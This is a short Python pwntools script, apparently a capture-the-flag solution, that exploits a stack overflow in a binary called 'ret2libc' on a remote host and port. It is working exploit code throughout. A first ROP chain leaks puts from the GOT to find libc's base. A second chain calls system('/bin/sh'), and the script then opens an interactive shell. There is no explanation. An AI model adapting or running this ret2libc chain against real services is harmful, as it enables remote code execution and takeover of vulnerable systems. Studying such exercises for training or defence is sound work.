from pwn import *
import sys

elf = ELF('ret2libc')
libc = ELF('libc-2.31.so')

context.update(os='linux', arch='amd64', binary=elf)

host = '143.198.127.103'
port = 42001

if args.LOCAL:
	p = elf.process()
else:
	p = remote(host, port)

p.recvuntil(b'[y/N]\n')

pop_rdi = 0x40155b

offset = 40
func = 'puts'
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(elf.got[func])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['learn'])
p.sendline(payload)
p.recvuntil(b'natural!\n\n')

leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols[func]
binsh = next(libc.search(b'/bin/sh'))

log.info(f'Leaked {func}: {hex(leak)}')
p.recvuntil(b'[y/N]\n')

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(libc.symbols['system'])

p.sendline(payload)
p.recvuntil(b'natural!\n\n')

p.interactive()

p.close()
